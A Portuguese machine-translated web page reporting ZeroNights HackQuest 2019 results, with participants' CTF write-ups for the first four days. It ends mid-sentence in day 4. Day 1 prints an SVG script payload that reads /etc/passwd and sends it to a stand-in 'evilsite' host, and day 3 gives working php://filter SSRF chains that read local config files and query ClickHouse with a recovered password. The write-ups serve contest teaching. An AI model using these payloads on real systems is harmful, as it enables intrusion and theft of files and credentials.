<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>↘️ 🔺 👨🏾‍🎓 ZeroNights Hackquest 2019. Resultados e críticas 🎗️ 🎓 🧗🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Mais recentemente, o HackQuest anual, programado para coincidir com a conferência ZeroNights, terminou. Como nos anos anteriores, os participantes tiv...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest 2019. Resultados e críticas</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p> Mais recentemente, o HackQuest anual, programado para coincidir com a conferência ZeroNights, terminou.  Como nos anos anteriores, os participantes tiveram que resolver 7 tarefas diferentes - uma para o dia da busca.  As atribuições, como sempre, ajudaram a preparar nossos parceiros da comunidade.  Você pode descobrir como as tarefas foram resolvidas e quem se tornou o vencedor do hackquest desta vez, sob o corte. </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="imagem"><br><a name="habracut"></a><br><h2>  Dia 1. MUITO SECRETO </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td><td align="center">  <b>2º lugar</b> </td></tr><tr><td align="center">  vladvis </td><td align="center">  gotdaswag </td></tr></tbody></table></div><br><p>  A primeira tarefa deste ano foi preparada pela equipe de auditoria de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Segurança Digital</a> .  Para resolvê-lo, os participantes tiveram que passar por três etapas: acessar o conteúdo do bate-papo interno do portal do jogo, explorar a vulnerabilidade no bot Discord e usar a configuração de direitos incorretos no cluster Kubernetes. </p><br><div class="spoiler">  <b class="spoiler_title">A decisão da tarefa do primeiro dia (vladvis)</b> <div class="spoiler_text"><h2>  1º passo: graphql </h2><br><ul><li>  Inicialmente, chegamos a um aplicativo da Web com um jogo e classificação do cliente js. <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li>  Além da estática, apenas uma solicitação é feita ao back-end: <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li>  Você pode obter uma lista de todos os tipos e seus campos com a seguinte consulta: <br><pre><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li>  Vemos o campo de comentário, solicitamos na solicitação inicial e obtemos um link para a próxima etapa. </li></ul><br><h2>  Segundo passo: bot Discord </h2><br><ul><li>  Um bot nos encontra no servidor e cria um canal separado para nós <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li>  Imediatamente vemos uma dica do SSRF na gitea, mas nunca cheguei a isso = ( </li><li>  Tentamos ler o arquivo local: <br><pre> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li>  Obtemos o / etc / passwd e vemos 2 usuários: worker, em cujo nome svg e gitea são renderizados <br><pre> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li>  Nesta etapa, eu segui um caminho não intencional: em .bash_history, o trabalhador tinha caminhos para a chave ssh e o endereço do servidor para o próximo estágio <br><pre> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2>  3º passo: kubernetes </h2></li><li>  Parece que cheguei a esse estágio primeiro.  .bash_history e ps estavam vazios e, a partir disso, concluí que para cada ip é criado um ambiente isolado <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li>  Um token para kubernetes foi encontrado no mount <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li>  No começo, não estava claro onde obter o token, e comecei a escanear a grade ... e, em algum momento, comecei a andar pelos vizinhos na nuvem </li><li>  Depois disso, foi emitida uma dica sobre quais sub-redes devem ser verificadas e o api kubernetes restante foi encontrado quase imediatamente </li><li>  Nesse ponto, percebi que não estava sozinho no servidor e não havia desejo de cortar algo, por exemplo, mascarar o cmdline, então decidi fazê-lo <del>  mais fácil </del>  é mais doloroso e encaminha para si próprio proxy socks através do ssh </li><li>  Usando os <code>kubectl get pods</code> , uma lista de contêineres foi obtida e a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">documentação</a> do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">kubernetes</a> sugeria que o exec poderia ser usado com a mesma sintaxe do docker </li><li>  Depois, houve 1,5 horas de sofrimento com o proxy socks, através do qual o websocket para exec não aumentou.  Acabei indo diretamente para o kubectl via ssh <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li>  O segundo contêiner possui um novo token e já tinha acesso ao cluster no espaço para nome vizinho zn2 (inicialmente estamos no espaço para nome zn1), a partir do qual o redis estava visível </li><li>  Recordamos o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">relatório</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">@paulaxe</a> do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Zeronights</a> do passado e obtemos o RCE, por exemplo, usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">este PoC</a> </li><li>  Após receber o próximo token, você pode retirar a bandeira dos segredos do kubernetes <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2>  Dia 2. MICOSOFT LUNIX </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td><td align="center">  <b>2º lugar</b> </td><td align="center">  <b>3º lugar</b> </td></tr><tr><td align="center">  rasgado </td><td align="center">  Sin__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center">  Também decidido: demidov_al, gotdaswag, medidrdrider, groke_is_love_groke_is_life </td></tr></tbody></table></div><br><p>  A tarefa do segundo dia foi preparada por membros da comunidade <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">r0 Crew</a> .  Para resolver isso, você precisa gerar uma chave de ativação para uma imagem do Linux com um kernel modificado. </p><br><div class="spoiler">  <b class="spoiler_title">A decisão da tarefa do segundo dia (rasgada)</b> <div class="spoiler_text"><p>  <code>jD74nd8_task2.iso</code> : arquivo <code>jD74nd8_task2.iso</code> , imagem ISO inicializável.  A partir dos arquivos dentro da imagem, podemos assumir que é Linux: existe um kernel <code>boot/kernel.xz</code> , um ramdisk inicial <code>boot/rootfs.xz</code> e um gerenciador de inicialização <code>boot/syslinux/</code> . </p><br><p>  Estamos tentando descompactar o núcleo e o ramdisk.  O Ramdisk aqui é um arquivo cpio comum compactado pelo xz.  Descompacte o kernel usando o script <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a> .  Você também pode prestar atenção às informações do kernel: </p><br><pre> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p>  Ao longo do caminho, encontramos na imagem iso a principal tarefa do <code>minimal/rootfs/bin/activator</code> : tudo se resume a escrever os dados de email inseridos e a chave de ativação no dispositivo <code>/dev/activate</code> no formato <code>$email|$key</code> .  No caso de uma verificação bem-sucedida da chave, a leitura de <code>/dev/activate</code> produzirá a linha <code>ACTIVATED</code> , e o ativador nesse caso iniciará o jogo 2048. </p><br><p>  É hora de olhar para a tarefa em dinâmica.  Para fazer isso, execute o emulador no KVM: </p><br><pre> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p>  O Linux inicia e inicia <code>/bin/activator</code> imediatamente a partir da sobreposição.  Isso está escrito em <code>/etc/inittab</code> .  Para evitar cavar no binar por um longo tempo, eu queria obter um shell e olhar pelo menos em <code>/proc</code> e <code>/sys</code> .  A maneira mais fácil para mim era simplesmente fazer upload do arquivo iso para o local onde o próprio script do ativador está localizado.  Em vez de <code>sleep 1</code> conjunto <code>/bin/sh</code> , ou seja,  Recebi um shell após cada tentativa de inserir um serial. </p><br><p>  Portanto, existe um shell: parece que <code>/proc/kallsyms</code> ausente, ou seja,  caracteres do kernel ausentes.  Com eles, é claro, seria muito mais rápido, mas tudo bem.  Estamos procurando informações sobre o dispositivo <code>/dev/activator</code> : </p><br><pre> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p>  A partir das informações em <code>/proc/devices</code> pode ser visto que este é um dispositivo char com a versão principal 252 e o menor 0. </p><br><p>  Está na hora de encontrar a função de registro deste dispositivo no binário do kernel para encontrar o manipulador para sua operação de <code>write</code> .  Para fazer isso, encontre referências cruzadas à sequência de caracteres <code>activate</code> .  Mas não existe essa linha no kernel, provavelmente está de alguma forma oculta. </p><br><p>  Na próxima tentativa, tentamos encontrar as funções responsáveis ​​pelo registro dos dispositivos de caracteres: <code>cdev_add</code> e <code>register_chrdev</code> .  Isso pode ser feito através da referência cruzada <code>/dev/console</code> ou qualquer outro dispositivo de caractere e usando o código-fonte do kernel (peguei a versão 5.0.11, mas não tenho certeza se a versão está correta).  Tendo examinado a lista de dispositivos que estão sendo registrados, não encontramos um dispositivo com a versão principal 252. É provável que essas duas funções não sejam registradas. </p><br><p>  Vamos tentar procurar outras pistas na dinâmica: </p><br><pre> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p>  Aqui está o problema - a <code>EEy????I</code> dispositivo <code>EEy????I</code>  Tentamos encontrar essa linha no binar e ela está lá! </p><br><p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p>  Embora nenhuma referência cruzada tenha sido encontrada, mas ao lado dele há dados visíveis semelhantes às strings.  Se você observar o código que os utiliza, poderá ver que esses são os manipuladores de leitura e gravação desejados do dispositivo de <code>activate</code> que são criptografados com o XOR simples. </p><br><p>  Função de processamento de leitura: </p><br><p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p>  A função de processar a operação de gravação, também é uma verificação de licença: </p><br><p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p>  Uma inspeção rápida do código de verificação de ativação mostrou que é mais fácil colocar um ponto de interrupção no endereço <code>0xFFFFFFFF811F094B</code> e pegar o código de ativação lá, sem realmente investigar o que está acontecendo lá.  Para fazer isso, execute o qemu com o sinalizador <code>-s</code> .  Nesse caso, o qemu executa o gdb stub, que permite usar qualquer cliente gdb.  A maneira mais fácil e rápida de fazer isso no IDA Pro, se você tiver uma licença.  Mas ninguém proíbe fazer tudo no console gdb. </p><br><p>  Fazemos tudo conforme descrito no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">tutorial</a> oficial.  Agora você precisa encontrar a função de processamento dentro do kernel já em execução. </p><br><p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p>  Como o kernel é construído com o suporte KASLR, os endereços do kernel em execução são alterados para um deslocamento aleatório que é gerado toda vez que o kernel é iniciado.  Calculamos esse deslocamento (pegamos o endereço da sequência de bytes exclusiva no código do kernel depurado e subtraímos o endereço dessa sequência no binário) e, adicionando a função de ativação ao endereço, encontramos na memória.  Tudo, agora cabe aos pequenos.  Defina um ponto de interrupção e escolha o código. </p><br><p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p>  A solução para esta tarefa já foi publicada no hub por um dos participantes.  Você pode se familiarizar com isso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . </p><br><h2>  Dia 3. CASA DE MORDIDO </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td></tr><tr><td align="center">  blackfan </td></tr></tbody></table></div><br><p>  Trabalho preparado por beched ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">DeteAct</a> ).  Os participantes foram recebidos por uma página de pagamento normal.  Para a solução, foi necessário acessar o banco de dados Clickhouse usando o recurso da função php <code>file_get_contents</code> . </p><br><div class="spoiler">  <b class="spoiler_title">A decisão da tarefa do terceiro dia (blackfan)</b> <div class="spoiler_text"><p>  A tarefa é uma página de pagamento, onde o único parâmetro interessante foi callback_url. </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p>  Indicamos seu site e atendemos à solicitação: </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p>  Uma resposta HTTP será exibida apenas se o site retornou uma sequência alfanumérica.  Exemplos de respostas: </p><br><pre> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p>  Tentamos como callback_url data :, testamos e entendemos que, provavelmente, esse é o PHP. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Usamos o filtro php: // para ler arquivos locais e codificar a resposta usando convert.base64-encode, para que a resposta corresponda alfanumérica.  Devido aos caracteres +, / e =, às vezes é necessário combinar várias chamadas base64 para exibir uma resposta. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p>  A saída da resposta é limitada a 200 bytes, mas a partir dos fragmentos que aprendemos sobre a disponibilidade do banco de dados no host local.  Classificamos as portas via callback_url e encontramos um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">novo artigo sobre injeção no ClickHouse no blog DeteAct</a> , que corresponde ao estranho nome da tarefa "HOUSE OF BECHED". </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p>  O ClickHouse possui uma interface HTTP que permite executar solicitações arbitrárias, o que é muito conveniente para usar no SSRF. </p><br><p>  Lemos a documentação, tentamos obter uma conta na configuração. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p>  Mais uma vez, limitar a saída interfere e, a julgar pelo arquivo padrão, o campo desejado está extremamente distante. </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p>  Corte o excesso usando o filtro string.strip_tags. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Mas o comprimento da saída ainda não é suficiente até que a senha seja recebida.  Adicione um filtro de compactação zlib.deflate. </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  E leia localmente na ordem inversa: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p>  Após receber a senha, podemos enviar solicitações ClickHouse da seguinte maneira: </p><br><pre> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p>  Mas desde que enviamos inicialmente o POST, precisamos contornar isso usando o redirecionamento.  E a solicitação final acabou assim (nesta fase, eu fui muito burra, porque devido ao grande aninhamento do processamento dos parâmetros, codifiquei incorretamente caracteres especiais e não pude executar a solicitação) </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  Bem, basta obter os dados do banco de dados: </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2>  Dia 4. ASR-EHD </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p>  A tarefa do quarto dia foi preparada pelo Departamento de Pesquisa de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Segurança Digital</a> .  A principal tarefa da tarefa foi mostrar como a escolha errada da fonte de números aleatórios pode afetar o algoritmo criptográfico.  Na taskka, um gerador de chave privada aleatória auto-escrita para DH foi implementado, com base no LFSR.  Ao receber um número suficiente de handshakes TLS consecutivos usando valores DH públicos, foi possível restaurar o estado inicial do LFSR e descriptografar todo o tráfego. </p><br><div class="spoiler">  <b class="spoiler_title">A decisão da tarefa do quarto dia (AV1ct0r)</b> <div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r">  Dia 4 / ASR-EHD - WriteUp by AV1ct0r </h1><br><p>  Peter é um pouco paranóico: ele sempre usa conexões criptografadas.  Para ter certeza de que os algoritmos são seguros, Peter usa seu próprio cliente.  Ele até nos deu um despejo de tráfego que foi feito enquanto usava seu cliente personalizado.  A conexão de Peter é realmente segura? </p><br><p>  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol><li><p>  Abra o arquivo do cliente no IDA Pro e verifique se ele pode baixar parte do arquivo flag.jpg do servidor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://ssltest.a1exdandy.me:443/</a> .  Qual parte do arquivo para baixar (a partir do qual byte) é obtida na linha de comando. </p><br><pre> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p>  Não havia fotos com a bandeira no servidor, mas o dump.pcap acabou tendo um monte de tráfego SSL, presumivelmente com partes da foto.  Após uma verificação rápida do servidor para detectar heartbleed (para roubar uma chave privada para descriptografar o tráfego), descobriu-se que o servidor não está vulnerável.  Além disso, nas sessões SSL, de acordo com o dump de tráfego e o cliente, é usada a cifra DHE-RSA-AES128-SHA256, na qual o RSA é usado apenas para assinatura, e as chaves são trocadas de acordo com o esquema Diffie-Hellman (uma chave de servidor RSA privada nesse modo não nos ajudará ) </p><br></li><li><p>  Tendo um pouco de podirbastiv, o servidor encontrou o arquivo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://ssltest.a1exdandy.me/x</a> , que é um malware simples, o endereço do administrador costurado nele é 0x82C780B2697A0002 (0x82C780B2: 0x7a69 